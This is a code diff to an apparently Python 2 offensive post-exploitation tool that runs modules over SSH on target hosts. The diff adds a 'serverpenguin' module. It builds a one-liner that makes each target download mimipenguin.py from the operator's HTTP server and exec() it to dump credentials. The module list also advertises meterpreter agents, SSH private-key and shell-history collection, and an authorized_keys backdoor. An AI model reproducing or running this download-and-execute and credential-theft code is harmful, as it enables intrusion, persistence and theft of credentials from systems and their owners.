@@ -270,9 +270,10 @@ def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, pass
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])
 
 
-def start_server(a,PORT):
+def start_server(a, PORT):
     Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-    httpd = SocketServer.TCPServer(("", PORT), Handler)
+    SocketServer.ThreadingTCPServer.allow_reuse_address = True
+    httpd = SocketServer.ThreadingTCPServer(("", PORT), Handler)
     print "serving at port", PORT
     httpd.serve_forever()
 
@@ -282,6 +283,14 @@ def get_ip():
         [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in
          [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
     return local_ip
+
+
+def serverpenguin(lhost, lport, targets, port, username, password, identity_file):
+    print CGREEN + "[!] Spinning up HTTP server..." + CEND
+    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://" + str(
+        lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
+    print CGREEN + "[!] Executing mimipenguin via single server on the target, this may take a while..." + CEND
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 300])
 
 
 def mimipenguin(lhost, lport, targets, port, username, password, identity_file):
@@ -451,23 +460,26 @@ def print_modules():
     print ""
     print CRED + "Available Modules:" + CEND
     print CYELLOW + "[*] meterpreter" + CEND + "               Use this to execute a meterpreter agent on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: LHOST, LPORT"
+    print    "                              REQUIRED ARGUMENTS: LHOST, LPORT"
     print "                                 OPTIONAL ARGUMENTS: TYPE {python, php, 32, 64, osx}"
     print CYELLOW + "[*] mimipenguin" + CEND + "               Use this to execute a mimipenguin on the target(s) to recover credentials.  (Requires root)"
     print "                                 OPTIONAL ARGUMENTS: LISTEN, LHOST"
+    print CYELLOW + "[*] serverpenguin" + CEND + "             Use this to execute mimipenguin on couple of targets simultaneously with a single listening server. (Requires root)"
+    print "                                 Make sure you start the \'hwacha_listener.py\' script before using this module!"
+    print "                                 REQUIRED ARGUMENTS: LISTEN, LHOST"
     print CYELLOW + "[*] keys" + CEND + "                      Use this to collect SSH private keys from the target(s)."
     print CYELLOW + "[*] history" + CEND + "                   Use this to collect shell history files from the target(s)."
     print CYELLOW + "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
     print CYELLOW + "[*] backdoor" + CEND + "                  Creates an RSA key pair and adds public key to authorized_keys file on targets(s)."
     print CYELLOW + "[*] web_delivery" + CEND + "              Use this to execute a python script on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
     print "                                 OPTIONAL ARGUMENTS: LISTEN"
     print CYELLOW + "[*] custom_bin" + CEND + "                Use this to execute a custom binary on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
     print CYELLOW + "[*] sudo_exec" + CEND + "                 Use this to execute a custom binary (with sudo) on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
     print CYELLOW + "[*] shellcode" + CEND + "                 Use this to execute custom shellcode on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
 
 
 def banner():
@@ -513,18 +525,37 @@ def main():
     if args.options:
         options = dict(x.split('=') for x in args.options.split(' '))
 
-    if args.module == "mimipenguin":
+    if args.module == 'serverpenguin':
         if not args.options:
-            lport = 8080
-            lhost = get_ip()
+            print "The module requires options, You must supply LHOST and LISTEN"
+            print "Change the listening web server port with the LISTEN option"
+            print "Change the listening web server IP with the LHOST option"
+            exit()
         else:
             try:
                 lport = options['LISTEN']
+                lhost = options['LHOST']
+            except KeyError:
+                print "Change the listening web server port with the LISTEN option"
+                print "Change the listening web server IP with the LHOST option"
+                exit()
+        serverpenguin(lhost, lport, targets, 22, args.username, args.password, args.identity_file)
+
+    if args.module == "mimipenguin":
+        lport = 8080
+        if not args.options:
+            print "Getting machine's IP address..."
+            lhost = get_ip()
+        else:
+            try:
                 if 'LHOST' not in options:
                     print "Getting machine's IP address..."
                     lhost = get_ip()
+                elif 'LPORT' not in options:
+                    lhost = options['LHOST']
                 else:
                     lhost = options['LHOST']
+                    lport = options['LPORT']
             except KeyError:
                 print "Change the listening web server port with the LISTEN option"
                 print "Change the listening web server IP with the LHOST option"
